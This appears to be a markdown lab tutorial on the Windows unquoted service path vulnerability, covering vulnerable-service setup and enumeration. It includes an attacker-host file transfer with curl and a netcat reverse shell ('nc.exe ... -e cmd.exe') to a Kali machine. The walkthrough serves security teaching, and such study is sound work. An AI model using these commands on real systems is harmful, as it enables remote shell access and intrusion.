<h1 align="center"> Unquote Service Path </h1>



---

## Scope:




---

## Table of contents






---


# Introduction to Unquote Service Path


## What is Unquoted Service Path?
An unquoted service path vulnerability occurs when a Windows service is configured with an executable path that:
- Contains spaces
- Is **NOT** enclosed in quotes
- Has spaces in the directory structure


## How Windows Interprets Service Paths

When Windows starts a service with an unquoted path, it searches for the executable in this order:

- **Example Path**: `C:\Program Files\Vulnerable App\service.exe`

- Windows searches sequentially:
  - `C:\Program.exe`
  - `C:\Program Files\Vulnerable.exe`
  - `C:\Program Files\Vulnerable App\service.exe`

### Why This is Dangerous
- Attackers can place malicious executables in earlier paths
- No special privileges required for writing to some directories
- Service often runs with SYSTEM privileges




---




# Setup Lab

## 1. Create the vulnerable service
First press `Ctrl + S` -> type `cmd` -> choose `Run as Administrator`:
<img width="782" height="677" alt="image" src="https://github.com/user-attachments/assets/5e97b129-26e0-4b45-8128-3f6a279f1a56" />


### Create directories and a dummy binary
````
mkdir "C:\Program Files\Vuln Service"
copy C:\Windows\System32\notepad.exe "C:\Program Files\Vuln Service\service.exe"
````
<img width="1027" height="500" alt="image" src="https://github.com/user-attachments/assets/d8909eb2-43ce-47f6-9f9a-22019fb4edf9" />


### Create the service with an unquoted path
````
sc create VulnService binPath= "C:\Program Files\Vuln Service\service.exe" start= auto DisplayName= "Vulnerable Service"
sc description VulnService "Demo service with unquoted path"
````
- Check:
````
sc query VulnService
````
<img width="1306" height="325" alt="image" src="https://github.com/user-attachments/assets/946dd06e-2111-40fc-8ddb-bfdc8dd5b7a3" />

````
sc qc VulnService
````
<img width="693" height="290" alt="image" src="https://github.com/user-attachments/assets/6d9db129-04c7-47ae-a205-90a9a2d45a94" />


- Now we got successful.



## 2. Transfer Netcat & Get Shell from Victim to Kali:

Use a simple HTTP server to host the binary:

### On attacker (Kali)

- On kali find folder that have `nc.exe`:
````
which nc
````
<img width="266" height="87" alt="image" src="https://github.com/user-attachments/assets/575922ff-6b93-422a-a0f6-b7a02bf8d133" />

- Now we see it stay in `/usr/bin/nc`.

- Or to see detail:
````
whereis nc
````
<img width="497" height="106" alt="image" src="https://github.com/user-attachments/assets/3d9638fc-9387-41ea-a8bd-e6657059633d" />


- Check on kali we have nc.exe or not?
````
find / -iname "nc.exe" 2>/dev/null
````
<img width="523" height="96" alt="image" src="https://github.com/user-attachments/assets/4a7ba6aa-b304-4ac8-bfbb-63039692a13a" />


#### Copy nc.exe to a working folder
````
mkdir -p ~/tools
cp /usr/share/windows-resources/binaries/nc.exe ~/tools
cd ~/tools
ls
````
<img width="630" height="335" alt="image" src="https://github.com/user-attachments/assets/794bc47e-8636-4d32-b6b2-2696dcd8b2fc" />





#### Serve the file from Kali
````
python3 -m http.server 8000
````
<img width="670" height="188" alt="image" src="https://github.com/user-attachments/assets/9c2b6050-6048-4c70-bb07-5e3ed3e61ff3" />



### On Windows:
On the Windows target, we can pull the file down with builtâ€‘in tools:
````
curl http://192.168.127.128:8000/nc.exe -o nc.exe
````
<img width="983" height="737" alt="image" src="https://github.com/user-attachments/assets/47366a5c-efe4-4e0c-924d-9fcb437aa57a" />



### Start Listen

#### On kali
````
nc -lvnp 4444
````
<img width="376" height="127" alt="image" src="https://github.com/user-attachments/assets/35d00eba-0f03-4416-a15b-b58aa17e9804" />



#### On windows:
````
.\nc.exe 192.168.127.128 4444 -e cmd.exe
````
<img width="804" height="132" alt="image" src="https://github.com/user-attachments/assets/881d2a36-e6f6-46e2-8a56-39892d75adaf" />

- After back to our attacker:
<img width="772" height="282" alt="image" src="https://github.com/user-attachments/assets/5752546c-487b-41bb-9e4e-af62e661b439" />


- Now we succeed to get shell.



---





# Windows Unquote Service Path Methodology

## 1. Manual Enumeration

### Using SC (Service Control)

#### List all services with their binary paths
````
sc query state= all | findstr SERVICE_NAME
````
<img width="717" height="818" alt="image" src="https://github.com/user-attachments/assets/b57ac63f-1ce3-4c80-98bd-fc4fdf2caa9f" />



````
sc qc "VulnService"
````
<img width="732" height="302" alt="image" src="https://github.com/user-attachments/assets/78b5d926-9aff-4d9a-aa5e-5006445be1f6" />

- `VulnServer`: is our Nmae Service that we was create on above.



#### Find unquoted paths
````
for /f "tokens=2 delims=:" %i in ('sc query state= all ^| findstr SERVICE_NAME') do @sc qc %i | findstr BINARY_PATH_NAME
````
















